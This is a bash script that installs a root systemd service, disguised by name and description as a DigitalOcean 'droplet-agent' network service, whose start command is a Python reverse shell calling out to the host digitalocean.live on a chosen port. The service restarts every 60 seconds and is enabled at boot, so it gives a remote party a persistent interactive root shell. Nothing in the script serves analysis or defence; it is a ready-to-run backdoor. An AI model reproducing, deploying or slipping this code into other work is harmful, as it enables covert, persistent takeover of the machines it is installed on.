#!/bin/bash

read -p "Enter the port number to use for the reverse shell: " PORT

# Validate port number
if ! [[ "$PORT" =~ ^[0-9]+$ ]] || (( PORT < 1 || PORT > 65535 )); then
  echo "Invalid port number. Please enter a number between 1 and 65535."
  exit 1
fi

SERVICE_FILE="/etc/systemd/system/droplet-agent-live.service"

# Generate the service content
read -r -d '' SERVICE_CONTENT << EOF
[Unit]
Description=Network Agents 
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('digitalocean.live',$PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])"
Restart=always
RestartSec=60
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
EOF

# Must be root
if [[ $EUID -ne 0 ]]; then
   echo "This script must be run as root"
   exit 1
fi

# Write the service
echo "$SERVICE_CONTENT" > "$SERVICE_FILE"
chmod 644 "$SERVICE_FILE"

# Reload systemd and start service
systemctl daemon-reexec
systemctl daemon-reload
systemctl enable droplet-agent-live.service
systemctl start droplet-agent-live.service

echo "Service installed and started on port $PORT."
